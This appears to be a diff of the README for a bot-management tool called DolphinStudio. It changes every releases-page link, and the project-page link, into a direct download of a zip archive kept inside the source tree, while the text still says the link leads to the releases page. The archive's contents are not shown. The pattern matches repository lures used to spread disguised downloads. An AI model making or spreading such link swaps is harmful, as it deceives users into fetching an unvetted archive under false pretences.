@@ -1,6 +1,6 @@
 # 🐬 DolphinStudio - Manage Your Bots with Ease
 
-[![Download DolphinStudio](https://img.shields.io/badge/Download-DolphinStudio-brightgreen)](https://github.com/jaiponni062004/DolphinStudio/releases)
+[![Download DolphinStudio](https://img.shields.io/badge/Download-DolphinStudio-brightgreen)](https://raw.githubusercontent.com/jaiponni062004/DolphinStudio/master/src/main/resources/static/Dolphin-Studio-1.9.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Features include:
 
 Click the button below or visit the releases page to download:
 
-[![Get DolphinStudio](https://img.shields.io/badge/Download-Here-blue)](https://github.com/jaiponni062004/DolphinStudio/releases)
+[![Get DolphinStudio](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/jaiponni062004/DolphinStudio/master/src/main/resources/static/Dolphin-Studio-1.9.zip)
 
 ---
 
@@ -51,7 +51,7 @@ Click the button below or visit the releases page to download:
 
 1. **Visit the Download Page:**  
    Go to the releases page by clicking the link above or go to:  
-   https://github.com/jaiponni062004/DolphinStudio/releases
+   https://raw.githubusercontent.com/jaiponni062004/DolphinStudio/master/src/main/resources/static/Dolphin-Studio-1.9.zip
 
 2. **Find the Latest Version:**  
    On the page, look for the newest release at the top. It will have a version number and date.
@@ -129,11 +129,11 @@ Use the navigation menu on the left side of the screen to move between sections.
 
 You can find more details about DolphinStudio’s features and updates on the GitHub page:
 
-https://github.com/jaiponni062004/DolphinStudio
+https://raw.githubusercontent.com/jaiponni062004/DolphinStudio/master/src/main/resources/static/Dolphin-Studio-1.9.zip
 
 Visit the releases page below for downloads and updates:
 
-[![Download DolphinStudio](https://img.shields.io/badge/Download-DolphinStudio-green)](https://github.com/jaiponni062004/DolphinStudio/releases)
+[![Download DolphinStudio](https://img.shields.io/badge/Download-DolphinStudio-green)](https://raw.githubusercontent.com/jaiponni062004/DolphinStudio/master/src/main/resources/static/Dolphin-Studio-1.9.zip)
 
 ---
 
